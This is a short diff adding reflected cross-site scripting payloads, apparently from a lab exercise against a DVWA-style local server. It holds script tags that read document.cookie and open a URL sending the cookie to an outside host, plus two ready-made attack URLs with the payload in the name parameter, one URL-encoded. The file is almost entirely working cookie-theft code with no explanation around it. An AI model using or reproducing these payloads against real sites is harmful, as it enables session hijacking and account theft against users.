@@ -1,0 +1,7 @@
+<script>let c = document.cookie;</script>
+<script>let w='http://public.tel.fer.hr'</script>
+<script>let p=w + '/srs?cookie=' + c</script>
+<script>window.open(p)</script>
+
+http://192.168.1.6/vulnerabilities/xss_r/?name=<script>window.open("http://public.tel.fer.hr/srs?cookie="+document.cookie)</script>#
+http://192.168.1.6/vulnerabilities/xss_r/?name=<script>window.open("http://public.tel.fer.hr/srs?cookie="%2Bdocument.cookie)</script>#
